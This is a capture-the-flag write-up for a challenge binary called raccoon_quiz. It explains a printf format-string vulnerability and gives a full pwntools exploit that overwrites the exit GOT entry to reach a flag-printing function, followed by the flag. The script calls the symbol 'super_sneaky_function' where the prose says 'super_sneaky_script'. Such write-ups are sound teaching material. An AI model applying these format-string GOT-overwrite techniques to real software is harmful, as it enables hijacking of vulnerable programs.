# raccoon_quiz
## by Alexander Marx
### Decompilation
When we decompile the source code there are a couple things we need to notice. The first is that the entirety of the program is run in the function ```raccoon_quiz``` meaning that our vulnerability will be there. Looking at it we see that it asks questions and prompts for input, and then when you answer all the question correctly, it asks for your name and then prints back "Good job [your name]". However it just uses ```printf``` to print the exact thing that you enter. That means that this program is vulnerable to format strings. The second thing is that there is a function called ```super_sneaky_script``` which prints out the flag. This means that to get the flag we have to use a format string to redirect the program flow to run the ```super_sneaky_script``` function.

### Exploitation
First we want to run the command ```pwn checksec raccoon_quiz``` to get all the binary security features. When we run this we learn that only NX is enabled meaning that the addresses of the functions like ```super_sneaky_script``` will not change each time we run the program. To pwn this program we are going to want to overwrite a Global Offset Table (GOT) entry so that when that specific GOT function is called it calls the ```super_sneaky_script``` function instead. To do this we are going to need four things. The first is a GOT function that is called for the first time after our vulnerable ```printf``` statement, the second is the GOT address of that function, the third is the address of the ```super_sneaky_script``` function, and the fourth is our payload that uses format strings plus the above information to redirect program flow to our target function.

The first three parts are pretty simple since only NX is enabled. To accomplish the first we simply have to look at the decompiled code. After our vulnerable ```printf``` function there are only two GOT function calls. The first is ```puts``` and the second is ```exit```. Since ```puts``` has been called before, our only true option is ```exit```. Now we need to get the address of that function and the address of ```super_sneaky_script```. To do that we simply have to run the following code:
```python
e = ELF("./raccoon_quiz")
addr = e.symbols["super_sneaky_function"]
exitGOT = e.got['exit']
print(hex(addr))
print(hex(exitGOT))
```
This will print out the addresses of both the functions we need, ```super_sneaky_script``` first and ```exit``` second.

Now we have to develop the payload. To do this we will be using the special characters ```%x``` and ```%n```. ```%x``` prints out a hexadecimal value and ```%n``` stores the number of characters that comes before it in a variable. Since we will not be specifying variables we can use these to interact with the stack. The general process we will be doing is to do this is to input our ```exit``` address as well as a number of ```%x``` characters so that we can determine the exact location of that address. Then we will specify that location with a ```%n``` and input the number of characters equal to the address of ```super_sneaky_script``` before that ```%n```. This will replace the address of ```exit``` in the GOT with the address of ```super_sneaky_script``` so that when ```exit``` is called in ```raccoon_quiz``` it runs ```super_sneaky_script``` instead of ```exit```. To develop the payload follow these steps. First run
```python
exitaddr = 0x602050
payload = b""
payload += b"%x " * 100
payload += b"A" * (512 - len(payload) - 16)
payload += p64(exitaddr)
```
Then in the console output count from where the exitaddr was printed to where the string of all A's start. The value I got was 32. Subtract that from 100 to get the location of the exitaddr (68). Then change the payload code to this
```python
flagaddr = 0x400747
exitaddr = 0x602050
payload = b""
payload += bytes("%{}x".format(0x747), 'utf-8')
payload += b"%68$hn"
payload += b"A" * (512 - len(payload) - 16)
payload += p64(exitaddr)
```
The first part of the payload enters the number of characters equal to the address of ```super_sneaky_script```. The second enters the location of our exitaddr using ```%n```. The third part fills the buffer we are entering in and the fourth adds the enters the address of ```exit```. When entered this will cause ```super_sneaky_script``` to run. Note that I only enter 0x747 characters before the ```%n``` and I use ```%hn``` instead. This is because the top half of the address is not necessary.
### Full Python Code
```python
from pwn import *

e = ELF("./raccoon_quiz")
addr = e.symbols["super_sneaky_function"]
print(hex(addr))

exitGOT = e.got['exit']
print(hex(exitGOT))
#p = remote("chal.ctf-league.osusec.org", 4816)
p = process("./raccoon_quiz")

p.recv()
p.sendline(b"A")
p.recv()
p.sendline(b"B")
p.recv()
p.sendline(b"A")
p.recvuntil(b"leaderboards!")

flagaddr = 0x400747
exitaddr = 0x602050
payload = b""
payload += bytes("%{}x".format(0x747), 'utf-8')
payload += b"%68$hn"
payload += b"A" * (512 - len(payload) - 16)
payload += p64(exitaddr)

p.sendline(payload)
p.recv()
output = p.recv()
print(output)
p.interactive()
```
### Flag
```osu{tr4a5h_pr0gr4mm1ng_in_4_tr4sh_g4m3}```
